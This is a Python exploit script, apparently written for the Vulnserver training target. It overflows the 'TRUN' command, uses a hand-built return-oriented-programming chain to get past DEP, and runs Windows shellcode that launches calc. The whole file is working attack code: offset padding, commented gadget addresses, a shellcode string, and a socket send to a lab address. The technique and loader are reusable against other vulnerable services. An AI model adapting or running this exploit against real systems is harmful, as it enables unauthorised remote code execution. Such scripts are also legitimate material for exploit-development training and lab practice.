import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = '\x41' * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll


parameters = struct.pack('<L', 0x77E22341)
parameters += struct.pack('<L', 0x4c4c4c4c)
parameters += struct.pack('<L', 0x45454545)
parameters += struct.pack('<L', 0x03030303)
parameters += struct.pack('<L', 0x54545454)
parameters += struct.pack('<L', 0x62506040) #writable address

#0x77bf5b62: push esp ; pop ecx ; ret  ;  (1 found)
#0x77f42a99: mov eax, ecx ; ret  ;  (1 found)
#save ESP into ECX and EAX 

rop = struct.pack('<L', 0x77bf5b62)
rop += struct.pack('<L', 0x77f42a99)
#0x6ff821d5: add esp, 0x1C ; ret  ;  (1 found)
#jump over paramters 28 bytes
rop += struct.pack('<L', 0x6ff821d5)

#0x6ff59f14: inc ecx ; ret  ;  (1 found)
rop2 = struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)
rop2 += struct.pack('<L', 0x6ff59f14)

#0x77ef5b70: mov edx, ecx ; ret  ;  (1 found)
#rop2 += struct.pack('<L', 0x77ef5b70)
#0x6ffb615a: mov edx, ecx ; pop ebp ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x6ffb615a)
rop2 += struct.pack('<L', 0x41414141)

# increment edx 4 times
#0x77beb360: inc edx ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)

#0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141) #padding for pop ebp
rop2 += struct.pack('<L', 0x6ff7e29a) #updating and adding 100 bytes 
rop2 += struct.pack('<L', 0x41414141)

#0x6ff63bdb: mov dword [ecx], eax ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x6ff63bdb)
rop2 += struct.pack('<L', 0x41414141)

#0x77e93853: mov dword [edx], eax ; pop esi ; pop ebp ; retn 0x000C ;  (1 found)
rop2 += struct.pack('<L', 0x77e93853)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)

#0x77e0b793: xor eax, eax ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77e0b793)
rop2 += struct.pack('<L', 0x41414141)#padding for ret 0x000c
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)

#0x77f8c23c: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77f8c23c)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x77f8c23c)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x77f8c23c)
rop2 += struct.pack('<L', 0x41414141)

#inc edx ; ret  - reusing an earlier rop gadget
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)

#mov dword [edx], eax ; pop esi ; pop ebp ; ret 0x000c ; - reusing an earlier rop gadget
rop2 += struct.pack('<L', 0x77e93853)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)

# xor eax, eax ; ret - reusing an earlier rop gadget
rop2 += struct.pack('<L', 0x77e0b793)
#padding for ret 0x000c (this removes the next 3 addresses)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)

#0x77bd6cdc: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)




# inc edx ; ret - reusing an earlier rop gadet
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)
rop2 += struct.pack('<L', 0x77beb360)

#mov dword [edx], eax ; pop esi ; pop ebp ; ret 0x000c ; - reusing an earlier rop gadget
rop2 += struct.pack('<L', 0x77e93853)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)

#0x77f42a99: mov eax, ecx ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77f42a99)
rop2 += struct.pack('<L', 0x41414141) #padding to compensate for ret 0x00c
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x41414141)
#0x41ac80db: dec eax ; dec eax ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41ac80db)
rop2 += struct.pack('<L', 0x41ac80db)
#0x77ed5789: xchg eax, esp ; ret  ;  (1 found)
rop2+= struct.pack('<L', 0x77ed5789)

shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"

padding = "\x90" * 4
padding2 = "\x90" * 250


# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash)-len(parameters)-len(padding)-len(rop)-len(padding2)-len(padding2))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.103", 9999))
s.send(command+crash+rop+parameters+padding+rop2+padding2+shellcode+filler)
s.close()

